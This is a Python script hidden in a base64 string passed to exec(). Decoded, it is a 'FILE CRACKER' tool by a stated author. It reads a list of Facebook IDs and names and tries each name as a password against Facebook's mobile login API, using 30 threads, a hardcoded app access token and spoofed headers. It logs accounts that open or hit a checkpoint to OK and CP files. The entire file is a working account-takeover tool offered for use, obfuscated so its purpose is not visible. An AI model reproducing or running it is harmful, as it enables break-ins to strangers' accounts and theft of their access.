import base64
exec(base64.b64decode("IyEvdXNyL2Jpbi9weXRob24zDQojV3JpdHRlbiBieSBSQUpBDQppbXBvcnQgcmVxdWVzdHMsYnM0LGpzb24sb3Msc3lzLHJhbmRvbSxkYXRldGltZSx0aW1lLHJlDQp0cnk6DQoJaW1wb3J0IHJpY2gNCmV4Y2VwdCBJbXBvcnRFcnJvcjoNCglvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJpY2gnKQ0KCXRpbWUuc2xlZXAoMSkNCgl0cnk6DQoJCWltcG9ydCByaWNoDQoJZXhjZXB0IEltcG9ydEVycm9yOg0KCQlleGl0KCdb4pyTXSBJbnRlcm5ldCBFcm9yICxJbnN0YWxsIE1hbnVhbCAocGlwIGluc3RhbGwgcmljaCknKQ0KZnJvbSByaWNoLnRhYmxlIGltcG9ydCBUYWJsZSBhcyBtZQ0KZnJvbSByaWNoLmNvbnNvbGUgaW1wb3J0IENvbnNvbGUgYXMgc29sDQpmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cCBhcyBwYXJzZXINCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IgYXMgdHJlZA0KZnJvbSByaWNoLmNvbnNvbGUgaW1wb3J0IEdyb3VwIGFzIGdwDQpmcm9tIHJpY2gucGFuZWwgaW1wb3J0IFBhbmVsIGFzIG5lbA0KZnJvbSByaWNoIGltcG9ydCBwcmludCBhcyBjZXRhaw0KZnJvbSByaWNoLm1hcmtkb3duIGltcG9ydCBNYXJrZG93biBhcyBtYXJrDQpmcm9tIHJpY2guY29sdW1ucyBpbXBvcnQgQ29sdW1ucyBhcyBjb2wNCnRyeTp1Z2VuID0gb3BlbigndXNlci50eHQnLCdyJykucmVhZCgpLnNwbGl0bGluZXMoKQ0KZXhjZXB0OnVnZW4gPSBbJ01vemlsbGEvNC4xIChjb21wYXRpYmxlOyBNU0lFIDUuMDsgU3ltYmlhbiBPUzsgTm9raWEgNzYxMDs0NTEpIE9wZXJhIDYuMjAnXSAjUkFKQQ0KdHJ5OnVnZW4yID0gb3BlbigndXNlcjIudHh0JywncicpLnJlYWQoKS5zcGxpdGxpbmVzKCkNCmV4Y2VwdDp1Z2VuMiA9IFsnTW96aWxsYS80LjEgKGNvbXBhdGlibGU7IE1TSUUgNS4wOyBTeW1iaWFuIE9TOyBOb2tpYSA3NjEwOzQ1MSkgT3BlcmEgNi4yMCddICNSQUpBDQoNCmlkLGlkMixsb29wLG9rLGNwLGFrdW4sb3ByZWssbWV0aG9kLGxpc2Vuc2lrdSx0YXBsaWthc2ksdG9rZW5rdSx1aWQsbGlzZW5zaWt1bmk9IFtdLFtdLDAsMCwwLFtdLFtdLFtdLFtdLFtdLFtdLFtdLFtdDQoNCnggPSAnXDAzM1s5M20nDQprID0gJ1wwMzNbOTNtJw0KaCA9ICdceDFiWzE7OTJtJw0KaGggPSAnXDAzM1s5Mm0nDQp1ID0gJ1wwMzNbOTVtJw0Ka2sgPSAnXDAzM1s5M20nDQpiID0gJ1wzM1sxOzk2bScNCnAgPSAnXHgxYlsxOzk1bScNClAgPSAnXDAzM1swOzAwbScNCkogPSAnXDAzM1sxOzkzbScNClMgPSAnXDAzM1swOzAwbScNCk4gPSAnXHgxYlswbScNCkkgPSdcMDMzWzE7OTJtJw0KQyA9J1wwMzNbMTs5Nm0nDQpNID0nXDAzM1sxOzkxbScNClUgPSdcMDMzWzE7OTVtJw0KSyA9J1wwMzNbMTs5M20nDQpQPSdcMDMzWzAwbScNCmg9J1wwMzNbMTs5MG0nDQpRPSJcMDMzWzAwbSINCmtrPSdcMDMzWzE7OTJtJw0KZmY9J1wwMzNbMTs5Nm0nDQpHPSdcMDMzWzE7OTZtJw0KcD0nXDAzM1swMG0nDQpoPSdcMDMzWzE7OTBtJw0KUT0iXDAzM1swMG0iDQpJPSdcMDMzWzE7OTJtJw0KSUk9J1wwMzNbMTs5Nm0nDQptPSdcMDMzWzE7OTFtJw0KTyA9J1wwMzNbMTs5M20nDQpIPSdcMDMzWzE7OTNtJw0KYiA9ICdcMDMzWzE7OTZtJw0Kd2FyID0gIlvigKJdIg0KQiA9IHJhbmRvbS5jaG9pY2UoW1UsSSxLLGIsTV0pDQoNCmRpYyA9IHsnMSc6J0phbnVhcmknLCcyJzonRmVicnVhcmknLCczJzonTWFyZXQnLCc0JzonQXByaWwnLCc1JzonTWVpJywnNic6J0p1bmknLCc3JzonSnVsaScsJzgnOidBZ3VzdHVzJywnOSc6J1NlcHRlbWJlcicsJzEwJzonT2t0b2JlcicsJzExJzonTm92ZW1iZXInLCcxMic6J0Rlc2VtYmVyJ30NCmRpYzIgPSB7JzAxJzonSmFudWFyaScsJzAyJzonRmVicnVhcmknLCcwMyc6J01hcmV0JywnMDQnOidBcHJpbCcsJzA1JzonTWVpJywnMDYnOidKdW5pJywnMDcnOidKdWxpJywnMDgnOidBZ3VzdHVzJywnMDknOidTZXB0ZW1iZXInLCcxMCc6J09rdG9iZXInLCcxMSc6J05vdmVtYmVyJywnMTInOidEZXNlbWJlcid9DQp0Z2wgPSBkYXRldGltZS5kYXRldGltZS5ub3coKS5kYXkNCmJsbiA9IGRpY1soc3RyKGRhdGV0aW1lLmRhdGV0aW1lLm5vdygpLm1vbnRoKSldDQp0aG4gPSBkYXRldGltZS5kYXRldGltZS5ub3coKS55ZWFyDQpva2MgPSAnT0stJytzdHIodGdsKSsnLScrc3RyKGJsbikrJy0nK3N0cih0aG4pKycudHh0Jw0KY3BjID0gJ0NQLScrc3RyKHRnbCkrJy0nK3N0cihibG4pKyctJytzdHIodGhuKSsnLnR4dCcNCg0KZGVmIGphbGFuKHopOg0KICAgIGZvciBlIGluIHogKyAiXG4iOnN5cy5zdGRvdXQud3JpdGUoZSk7c3lzLnN0ZG91dC5mbHVzaCgpO3RpbWUuc2xlZXAoMC4wNCkNCmRlZiBtbGFrdSh6KToNCiAgICBmb3IgZSBpbiB6ICsgIlxuIjpzeXMuc3Rkb3V0LndyaXRlKGUpO3N5cy5zdGRvdXQuZmx1c2goKTt0aW1lLnNsZWVwKDAuMDMpDQogICAgDQpkZWYgY2xlYXIoKToNCglvcy5zeXN0ZW0oJ2NsZWFyJykNCmRlZiBiYWNrKCk6DQoJbWVudSgpDQpkZWYgYmFubmVyKCk6DQoJY2xlYXIoKQ0KCXByaW50KCIiIiVzXG5ceDFiWzkzOzFtDQrilojilojilojilojilojilojilZcgIOKWiOKWiOKWiOKWiOKWiOKVlyAgICAgIOKWiOKWiOKVlyDilojilojilojilojilojilZcgDQrilojilojilZTilZDilZDilojilojilZfilojilojilZTilZDilZDilojilojilZcgICAgIOKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVlw0K4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4paI4paI4pWRICAgICDilojilojilZHilojilojilojilojilojilojilojilZENCuKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKWiOKWiOKVkeKWiOKWiCAgIOKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVkQ0K4paI4paI4pWRICDilojilojilZHilojilojilZEgIOKWiOKWiOKVkeKVmuKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKVkSAg4paI4paI4pWRDQrilZrilZDilZ0gIOKVmuKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWdIOKVmuKVkOKVkOKVkOKVkOKVnSDilZrilZDilZ0gIOKVmuKVkOKVnQ0KXHgxYls5MjsxbeKVlOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVlw0KW+KAol0gQXV0aG9yOiBBSFNBTiBKVVRUDQpb4oCiXSBGYWNlYm9vazogZmFjZWJvb2suY29tL1JBSkEuSE9ORVkuSlVUVDMwMg0KW+KAol0gR2l0aHViOiBnaXRodWIuY29tL2Foc2FuNjY3OCAgIA0KW+KAol0gVG9vbHM6IEZJTEUgQ1JBQ0tFUg0KW+KAol0gTk9URTogU1BFRUQgREVQRU5EUyBPTiBORVRXT1JLIEpBTklJICAgICANCuKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVnVx4MWJbOTI7MW0NCiIiIiUoaCkpDQoJCQ0KZGVmIG1lbnUoKTogI1JBSkENCgliYW5uZXIoKQ0KCXByaW50KCIiKSAjUkFKQQ0KCXByaW50KCIiIiVzIFx4MWJbOTI7MW09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT5ceDFiWzkyOzFtICIiIiUoaCkpDQoJcHJpbnQoIiIiJXMgXDMzWzE7MzNtWzFdIEZJTEUgQ1JBQ0sgICIiIiUoaCkpDQoJcHJpbnQoIiIiJXMgXDMzWzE7MzNtWzBdIEV4aXQiIiIlKGgpKQ0KCXByaW50KCIiIiVzIFx4MWJbOTI7MW09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT5ceDFiWzkyOzFtICIiIiUoaCkpDQoJUkFKQSA9IGlucHV0KHgrJ1wzM1sxOzk2beKAoklucHV0IE51bWJlcj4gJykNCglpZiBSQUpBIGluIFsnMScsJzAxJ106DQoJCUZpbGUyKCkNCgllbGlmIFJBSkEgaW4gWycwJywnMDAnXToNCgkJZXhpdCgpDQpkZWYgRmlsZTIoKToNCgkJCWNsZWFyKCkNCgkJCWJhbm5lcigpDQoJCQl0cnk6DQoJCQkJZmlsZVggPSBpbnB1dCAoJ1xuIFsrXSBFbnRlciBmaWxlIHBhdGggOiAnKSANCgkJCQlmb3IgbGluZSBpbiBvcGVuKGZpbGVYLCAncicpLnJlYWRsaW5lcygpOg0KCQkJCQlpZC5hcHBlbmQobGluZS5zdHJpcCgpKQ0KCQkJCXNldHRpbmcoKQ0KCQkJZXhjZXB0IElPRXJyb3I6DQoJCQkJZXhpdCgiXG4gWyFdIGZpbGUgJXMgbm90IGZvdW5kIiUoZmlsZVgpKQ0KDQpkZWYgc2V0dGluZygpOg0KCXByaW50KCIiIiVzIFx4MWJbOTI7MW09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT5ceDFiWzkyOzFtICIiIiUoaCkpDQoJcHJpbnQoIiIiJXMgXDMzWzE7MzNtWzAxXSBGYXJ3YXJkIENyYWNraW5nICIiIiUoaCkpDQoJcHJpbnQoIiIiJXMgXDMzWzE7MzNtWzAyXSBSZXZlcnNlIENyYWNraW5nICIiIiUoaCkpDQoJcHJpbnQoIiIiJXMgXHgxYls5MjsxbT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Plx4MWJbOTI7MW0gIiIiJShoKSkNCglSQUpBID0gaW5wdXQoeCsnXDMzWzE7OTZt4oCiSW5wdXQgTnVtYmVyPicpDQoJaWYgUkFKQSBpbiBbJzEnLCcwMSddOg0KCQlmb3IgYmFjb3QgaW4gaWQ6DQoJCQlpZDIuYXBwZW5kKGJhY290KQ0KCWVsaWYgUkFKQSBpbiBbJzInLCcwMiddOg0KCQlmb3IgYmFjb3QgaW4gaWQ6DQoJCQlpZDIuaW5zZXJ0KDAsYmFjb3QpDQoJDQoJZWxzZToNCgkJcHJpbnQoIiIiJXMgXDMzWzE7MzNtUm91bmcgSW5wdXQiIiIlKGgpKQ0KCQlleGl0KCkNCglwcmludCgiIiIlcyBceDFiWzkyOzFtPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0+XHgxYls5MjsxbSAiIiIlKGgpKQ0KCXByaW50KCIiIiVzIFwzM1sxOzMzbVswMV0gQi1BcGkgKGZhc3QpIiIiJShoKSkNCglwcmludCgiIiIlcyBceDFiWzkyOzFtPD09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Plx4MWJbOTI7MW0gIiIiJShoKSkNCglSQUpBID0gaW5wdXQoeCsnXDMzWzE7OTZt4oCiSW5wdXQgTnVtYmVyPiA6ICcpDQoJaWYgUkFKQSBpbiBbJzEnLCcwMSddOg0KCQltZXRob2QuYXBwZW5kKCdhcGknKQ0KCWVsc2U6DQoJCW1ldGhvZC5hcHBlbmQoJ2FwaScpDQoJcHJpbnQoIiIiJXMgXHgxYls5MjsxbT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Plx4MWJbOTI7MW0gIiIiJShoKSkNCglmYXN0ID0gaW5wdXQoeCsnXDMzWzE7OTZtIFdhbnQgVG8gU3RhcnQgPyAoeS90KSA6ICcpDQoJaWYgZmFzdCBpbiBbJ3knLCdZJ106DQoJCXBhc3N3cmQoKQ0KCWVsaWYgZmFzdCBpbiBbJ3QnLCdUJ106DQoJCWV4aXQoKQ0KDQpkZWYgcGFzc3dyZCgpOg0KCWNsZWFyKCkNCgliYW5uZXIoKQ0KCXByaW50KCIiIiVzIFx4MWJbOTI7MW09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT5ceDFiWzkyOzFtICIiIiUoaCkpDQoJcHJpbnQoeCsnICcraCsnICcreCsnIFRvdGFsIGlkcyA6ICcrc3RyKGxlbihpZCkpKQ0KCXByaW50KHgrJyAgIFsgIElGIE5PIFJFU1VMVCBVU0UgQUlSUExBTkUgTU9ERSAgXVxuICAgQ3JhY2tpbmcgU3RhcnRpbmcuLi4nKQ0KCXByaW50KCIiIiVzIFx4MWJbOTI7MW09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT5ceDFiWzkyOzFtICIiIiUoaCkpDQoJd2l0aCB0cmVkKG1heF93b3JrZXJzPTMwKSBhcyBwb29sOg0KCQlmb3IgeXV6b25nIGluIGlkMjoNCgkJCWlkZixubWYgPSB5dXpvbmcuc3BsaXQoJ3wnKVswXSx5dXpvbmcuc3BsaXQoJ3wnKVsxXS5sb3dlcigpDQoJCQlmcnMgPSBubWYuc3BsaXQoJyAnKVswXQ0KCQkJcHd2ID0gW10NCgkJCWlmIGxlbihubWYpPDY6DQoJCQkJaWYgbGVuKGZycyk8MzoNCgkJCQkJcGFzcw0KCQkJCWVsc2U6DQoJCQkJCXB3di5hcHBlbmQobm1mKQ0KCQkJZWxzZToNCgkJCQlpZiBsZW4oZnJzKTwzOg0KCQkJCQlwd3YuYXBwZW5kKG5tZikNCgkJCQllbHNlOg0KCQkJCQlwd3YuYXBwZW5kKG5tZikNCgkJCWlmICdhcGknIGluIG1ldGhvZDoNCgkJCQlwb29sLnN1Ym1pdChjcmFjazIsaWRmLHB3dikNCgkJCWVsc2U6DQoJCQkJcG9vbC5zdWJtaXQoY3JhY2syLGlkZixwd3YpDQoJcHJpbnQoJycpDQoJcHJpbnQoIiIiJXMgXHgxYls5MjsxbT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Plx4MWJbOTI7MW0gIiIiJShoKSkNCglleGl0c3MgPSBpbnB1dCh4KydcMzNbMTs5Nm0gV2FudCB0byBFeGl0ICh5L3QpIDogJykNCglpZiBleGl0c3MgaW4gWyd5JywnWSddOg0KCQlleGl0KCkNCgllbHNlOg0KCQlleGl0KCkNCg0KZGVmIGNyYWNrMihpZGYscHd2KToNCglnbG9iYWwgbG9vcCxvayxjcA0KCWJpID0gcmFuZG9tLmNob2ljZShbdSxrLGtrLGIsaCxoaF0pDQoJcGVycyA9IGxvb3AqMTAwL2xlbihpZDIpDQoJZmZmID0gJyUnDQoJcHJpbnQoJ1xyJXMgW1JBSkFdICVzLyVzICBPSyolcyB8IENQKiVzID0+ICVzJXMlcyclKGJpLGxvb3AsbGVuKGlkMiksb2ssY3AsaW50KHBlcnMpLHN0cihmZmYpLHgpLCBlbmQ9JyAnKTtzeXMuc3Rkb3V0LmZsdXNoKCkNCgl1YSA9IHJhbmRvbS5jaG9pY2UodWdlbikucmVwbGFjZSgnXG4nLCcnKQ0KCXNlcyA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KCWZvciBwdyBpbiBwd3Y6DQoJCXRyeToNCgkJCWhlYWQgPSB7IngtZmItY29ubmVjdGlvbi1iYW5kd2lkdGgiOiBzdHIocmFuZG9tLnJhbmRpbnQoMjAwMDAwMDAuMCwgMzAwMDAwMDAuMCkpLCAieC1mYi1zaW0taG5pIjogc3RyKHJhbmRvbS5yYW5kaW50KDIwMDAwLCA0MDAwMCkpLCAieC1mYi1uZXQtaG5pIjogc3RyKHJhbmRvbS5yYW5kaW50KDIwMDAwLCA0MDAwMCkpLCAieC1mYi1jb25uZWN0aW9uLXF1YWxpdHkiOiAiRVhDRUxMRU5UIiwgIngtZmItY29ubmVjdGlvbi10eXBlIjogImNlbGwuQ1RSYWRpb0FjY2Vzc1RlY2hub2xvZ3lIU0RQQSIsICJ1c2VyLWFnZW50IjogdWEsICJjb250ZW50LXR5cGUiOiAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIiwgIngtZmItaHR0cC1lbmdpbmUiOiAiTGlnZXIifQ0KCQkJcmVzcCA9IHNlcy5nZXQoImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2Zvcm1hdD1qc29uJmVtYWlsPSIrc3RyKGlkZikrIiZwYXNzd29yZD0iK3N0cihwdykrIiZjcmVkZW50aWFsc190eXBlPWRldmljZV9iYXNlZF9sb2dpbl9wYXNzd29yZCZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZlcnJvcl9kZXRhaWxfdHlwZT1idXR0b25fd2l0aF9kaXNhYmxlZCZzb3VyY2U9ZGV2aWNlX2Jhc2VkX2xvZ2luJm1ldGFfaW5mX2ZibWV0YT0lMjAmY3VycmVudGx5X2xvZ2dlZF9pbl91c2VyaWQ9MCZtZXRob2Q9R0VUJmxvY2FsZT1lbl9VUyZjbGllbnRfY291bnRyeV9jb2RlPVVTJmZiX2FwaV9jYWxsZXJfY2xhc3M9Y29tLmZhY2Vib29rLmZvcy5oZWFkZXJzdjIuZmI0YW9yY2EuSGVhZGVyc1YyQ29uZmlnRmV0Y2hSZXF1ZXN0SGFuZGxlciZhY2Nlc3NfdG9rZW49MzUwNjg1NTMxNzI4fDYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQzN2E0YTMyJmZiX2FwaV9yZXFfZnJpZW5kbHlfbmFtZT1hdXRoZW50aWNhdGUmY3BsPXRydWUiLCBoZWFkZXJzPWhlYWQpDQoJCQlpZiAid3d3LmZhY2Vib29rLmNvbSIgaW4gcmVzcC5qc29uKClbImVycm9yX21zZyJdOg0KCQkJCWlmICd5YScgaW4gb3ByZWs6DQoJCQkJCWFrdW4uYXBwZW5kKGlkZisnfCcrcHcpDQoJCQkJCWNla2VyKGlkZixwdykNCgkJCQllbHNlOg0KCQkJCQlwcmludCgnXHIlcyBbUkFKQS1DUF0gJXN8JXMgICAgICAgICclKGIsaWRmLHB3KSkNCgkJCQkJb3BlbignQ1AvJytjcGMsJ2EnKS53cml0ZShpZGYrJ3wnK3B3KydcbicpDQoJCQkJCWFrdW4uYXBwZW5kKGlkZisnfCcrcHcpDQoJCQkJCWNwKz0xDQoJCQkJYnJlYWsNCgkJCWVsaWYgInNlc3Npb25fa2V5IiBpbiByZXNwLnRleHQgYW5kICJFQUFCIiBpbiByZXNwLnRleHQ6DQoJCQkJcHJpbnQoJ1xyJXMgW29rXSAlc3wlcyAgICAgICAgJyUoaCxpZGYscHcpKQ0KCQkJCW9wZW4oJ09LLycrb2tjLCdhJykud3JpdGUoaWRmKyd8JytwdysnXG4nKQ0KCQkJCW9rKz0xDQoJCQkJYnJlYWsNCgkJCWVsc2U6DQoJCQkJY29udGludWUNCgkJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KCQkJdGltZS5zbGVlcCgzMSkNCglsb29wKz0xDQoNCmRlZiBSQUpBKHopOg0KICAgIGZvciBlIGluIHogKyAiXG4iOg0KICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGUpDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgICAgICB0aW1lLnNsZWVwKDAuMDQpDQpkZWYgUkFKQSh6KToNCiAgICBmb3IgZSBpbiB6ICsgIlxuIjoNCiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShlKQ0KICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICAgICAgdGltZS5zbGVlcCgwLjAzKQ0KDQoNCmlmIF9fbmFtZV9fPT0nX19tYWluX18nOg0KCW9zLnN5c3RlbSgnZ2l0IHB1bGwnKQ0KCXRyeTpvcy5ta2RpcignQ1AnKQ0KCWV4Y2VwdDpwYXNzDQoJdHJ5Om9zLm1rZGlyKCdPSycpDQoJZXhjZXB0OnBhc3MNCgltZW51KCkNCgk="))
